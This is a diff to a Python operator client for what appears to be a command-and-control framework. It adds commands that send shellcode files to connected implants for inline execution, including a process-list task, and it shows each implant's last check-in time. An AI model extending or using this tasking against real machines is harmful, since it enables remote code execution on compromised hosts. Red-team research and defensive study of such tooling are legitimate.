@@ -10,6 +10,7 @@ import time
 import base64
 import asyncio
 import argparse
+import datetime
 
 ##
 ## Library
@@ -29,10 +30,23 @@ if __name__ in '__main__':
     opts.add_argument( '-i', '--interact', help = 'ID of the agent to interact with.', required = False, default = '', type = str );
     opts.add_argument( '-b', '--block', help = 'Block until the task has been executed.', action = 'store_true', default = False );
     cmds = opts.add_subparsers( help = 'client commands.', dest = 'subcommand', required = True );
+
+    ##
+    ## Commands without arguments
+    ##
     cmds.add_parser( 'hello', help = 'Tasks the agent to say hello.' );
     cmds.add_parser( 'list', help = 'Prints a list of agents that are connected.' );
     cmds.add_parser( 'exit', help = 'Tasks the agent to exit. Cannot be blocked.' );
     cmds.add_parser( 'logs', help = 'Tasks the client to read the log queue.' );
+
+    ##
+    ## Commands with arguments
+    ## 
+    sopt = cmds.add_parser( 'inline-execute', help = 'Tasks the client to execute an inline command' );
+    sopt.add_argument( '-f', '--file', help = 'Path to a shellcode to execute.', type = argparse.FileType( 'rb+' ), required = True );
+
+    sopt = cmds.add_parser( 'process-list', help = 'Tasks the client to print a process list. ( inline-execute )' );
+    sopt.add_argument( '-s', '--shellcode', help = 'Path to the process list shellcode.', type = argparse.FileType( 'rb+' ), required = True );
     args = opts.parse_args();
 
     ##
@@ -62,7 +76,7 @@ if __name__ in '__main__':
                 ##
                 ## List information about the client
                 ##
-                logging.success( 'GUID: {} ID: {} Name: {} Arch: {}'.format( Client['guid'], Client['implant_id'], Client['machine_name'], Client['architecture'] ) );
+                logging.success( 'GUID: {} ID: {} NETBIOS: {} Arch: {} Last CheckIn: {}'.format( Client['guid'], Client['implant_id'], Client['machine_name'], Client['architecture'], time.strftime( '%m-%d %H:%M:%S', time.gmtime( Client['time_lastcheckin'] ) ) ) );
 
     ##
     ## Everything else
@@ -109,6 +123,24 @@ if __name__ in '__main__':
                         ## ExitFree has no buffer
                         ##
                         tasking.Task_ExitFree( Web, Client, args.block, args );
+
+                    ##
+                    ## Insert Task: InlineExecute
+                    ##
+                    if args.subcommand == 'inline-execute':
+                        ##
+                        ## InlineExecute has arguments
+                        ##
+                        tasking.Task_InlineExecute( Web, Client, args.block, args );
+
+                    ##
+                    ## Insert Task: InlineExecute
+                    ##
+                    if args.subcommand == 'process-list':
+                        ##
+                        ## InlineExecute has arguments
+                        ##
+                        tasking.Task_InlineExecute_ProcessList( Web, Client, args.block, args );
 
                     ##
                     ## Abort
